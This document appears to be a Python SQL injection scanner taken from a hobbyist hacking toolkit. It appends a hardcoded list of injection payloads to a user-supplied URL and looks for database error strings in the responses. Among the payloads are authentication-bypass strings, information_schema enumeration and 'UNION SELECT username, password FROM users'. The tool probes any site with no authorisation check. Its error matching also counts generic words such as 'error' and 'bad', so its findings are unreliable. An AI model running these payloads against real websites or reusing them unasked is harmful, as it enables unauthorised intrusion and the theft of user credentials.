import requests
import fade
import os
import time
import pyfiglet

def Slow(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.003)
    print()

def detect_sql_error_http(url):
    sql_message_error = [
        "SQL syntax", "SQL error", "MySQL", "mysql", "MySQLYou",
        "Unclosed quotation mark", "SQLSTATE", "syntax error", "ORA-", 
        "SQLite", "PostgreSQL", "Truncated incorrect", "Division by zero",
        "You have an error in your SQL syntax", "Incorrect syntax near", 
        "SQL command not properly ended", "sql", "Sql", "Warning", "Error",
        "ERROR", "exception", "Fatal error", "Invalid query", "Query failed",
        "error", "unexpected", "cannot", "unrecognized", "missing", "bad"
    ]

    sql_provocation_error = [
        "'", '"', "''", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
        "' OR 1=1 --", "' OR 1=1 /*", "' OR 'a'='a", "' OR 'a'='a' --",
        "' OR 'a'='a' /*", "' UNION SELECT NULL, NULL --", "' UNION SELECT 1, NULL --",
        "' AND 1=1 --", "' AND 1=CONVERT(int, (SELECT @@version));--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0;--",
        "' UNION SELECT 1, 'test', 'test';--", "' UNION ALL SELECT 1, 'test', 'test';--",
        "' OR 'a'='a' AND 1=1--", "' OR 'a'='a' AND 1=2--",
        "' AND 1=1 LIMIT 1 --", "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM information_schema.tables));--",
        "' OR 1=1;--", "' OR '1'='1'/*", "' OR 1=1/*", "' OR 'a'='a'--",
        "' OR 'x'='x'--", "' OR 1=1--", "' OR 1=1/*", "' UNION ALL SELECT NULL, NULL --",
        "' UNION SELECT username, password FROM users --", "' UNION SELECT NULL, NULL, NULL, NULL --",
        "' UNION SELECT 1, 2, 3, 4 --", "' UNION SELECT table_name, column_name FROM information_schema.columns --",
        "' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_schema=database()) --",
        "' OR 1=1 --", "' OR 1=1/*", "' AND 1=2--", "' AND 1=1 AND 1=1--",
        "' AND 1=1/*", "' OR '1'='1' --", "' OR '1'='1'/*",
        "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'users'));--",
        "' UNION SELECT table_schema, table_name FROM information_schema.tables --",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --"
    ]

    vulnerability = False
    error = None
    provocation = None

    try:
        for provocation_error in sql_provocation_error:
            test_url = url + provocation_error
            response = requests.get(test_url, timeout=10)
            response_status = response.status_code
            
            if response_status == 200:
                for message_error in sql_message_error:
                    if message_error.lower() in response.text.lower():
                        vulnerability = True
                        error = message_error
                        provocation = provocation_error
                        break
                if vulnerability:
                    break
    except Exception as e:
        Slow(f"Error occurred during detection: {e}")

    if vulnerability:
        Slow(f"{fade.water('SQL Vulnerability Detected:')} {fade.water('Vulnerability:')} {fade.water(vulnerability)} {fade.water('Error Found:')} {fade.water(error)} {fade.water('Provocation:')} {fade.water(provocation)}")
    else:
        Slow(f"{fade.water('No vulnerability detected.')}")

    return vulnerability

def main():
    art_sql = '''

  ██████   █████   ██▓        ██▒   █▓ █    ██  ██▓     ███▄    █ 
▒██    ▒ ▒██▓  ██▒▓██▒       ▓██░   █▒ ██  ▓██▒▓██▒     ██ ▀█   █ 
░ ▓██▄   ▒██▒  ██░▒██░        ▓██  █▒░▓██  ▒██░▒██░    ▓██  ▀█ ██▒
  ▒   ██▒░██  █▀ ░▒██░         ▒██ █░░▓▓█  ░██░▒██░    ▓██▒  ▐▌██▒
▒██████▒▒░▒███▒█▄ ░██████▒      ▒▀█░  ▒▒█████▓ ░██████▒▒██░   ▓██░
▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░      ░ ▐░  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░   ▒ ▒ 
░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░      ░ ░░  ░░▒░ ░ ░ ░ ░ ▒  ░░ ░░   ░ ▒░
░  ░  ░     ░   ░   ░ ░           ░░   ░░░ ░ ░   ░ ░      ░   ░ ░ 
      ░      ░        ░  ░         ░     ░         ░  ░         ░ 
                                  ░                               

                Made by Nkrz.dll | A little inspiration from RedTiger
'''
    
    Slow('Welcome to the SQL vulnerability detector via HTTP!')
    
    website_url = input(f"{fade.water('Enter the website URL (ending with a GET parameter, e.g., ?search=): ')}")
    if not website_url.startswith(('http://', 'https://')):
        website_url = 'https://' + website_url

    Slow(f"{fade.water('Searching for HTTP vulnerabilities...')}")
    detect_sql_error_http(website_url)

if __name__ == "__main__":
    main()
    input("[x] Appuyer sur entrée pour retourner au menu principal.")
    os.system('python ../../main.py')
